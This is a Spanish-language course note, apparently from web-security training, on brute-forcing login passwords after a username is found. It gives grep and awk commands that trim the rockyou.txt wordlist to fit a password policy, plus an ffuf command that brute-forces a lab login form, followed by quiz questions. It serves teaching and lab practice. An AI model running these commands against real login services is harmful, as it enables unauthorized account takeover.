# Módulo 08 — Broken Authentication

## Sección 4/14: Brute-Forcing Passwords

> [!NOTE]
> Una vez identificado un username válido, el brute-force explota que los usuarios eligen passwords débiles y las reutilizan entre servicios.

## 🎯 Por qué las passwords siguen siendo un problema

- **Reutilización**: habilita password spraying a gran escala
- **Passwords débiles**: vulnerables a brute-force automatizado

## 🛠️ Optimizando el wordlist según la política de passwords

> [!TIP]
> Si la app impone una política, filtrar el wordlist para que solo contenga candidatos que la cumplan — de lo contrario se pierde tiempo.

```bash
wc -l /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
# 14344391

grep '[[:upper:]]' rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
wc -l custom_wordlist.txt
# 151647
```

> [!TIP]
> Reducción de ~14.3M a ~150K — aproximadamente 99% menos, sin sacrificar candidatos válidos.

Alternativa con `awk`:
```bash
awk 'length($0) >= 10 && /[a-z]/ && /[A-Z]/ && /[0-9]/' rockyou.txt > custom_wordlist.txt
```

## 🛠️ Ejecutando el brute-force

```bash
ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=FUZZ" \
  -fr "Invalid username"
```

> [!TIP]
> El módulo remite a Cracking Passwords with Hashcat, Password Attacks, y Login Brute Forcing para técnicas más completas.

## 🧠 Quiz de repaso

<details>
<summary>¿Por qué filtrar el wordlist según la política es más eficiente que usar un wordlist más pequeño desde el principio?</summary>

Porque filtrar un wordlist masivo real (rockyou.txt) conserva la calidad y realismo de las contraseñas mientras elimina exactamente las que la app rechazaría, optimizando la relación señal/ruido sin sacrificar probabilidad de éxito.

</details>

<details>
<summary>¿Por qué es necesario interceptar el request de login antes de automatizar el ataque?</summary>

Porque cada aplicación nombra sus campos y mensajes de error de forma distinta — sin conocer estos detalles exactos, el comando de ffuf podría fallar silenciosamente.

</details>

> [!NOTE]
> **Ejercicio práctico (lab)** — El lab pide identificar la password del usuario admin. Metodología: wordlist filtrado por política, interceptar el mensaje de error exacto, y automatizar con ffuf.

## 🔗 Relacionado
- [03 — Enumerating Users](03-enumerating-users.md)
- [05 — Brute-Forcing Password Reset Tokens](05-brute-forcing-password-reset-tokens.md)

#cwes #modulo08 #broken-authentication #brute-force #ffuf #wordlists #password-policy
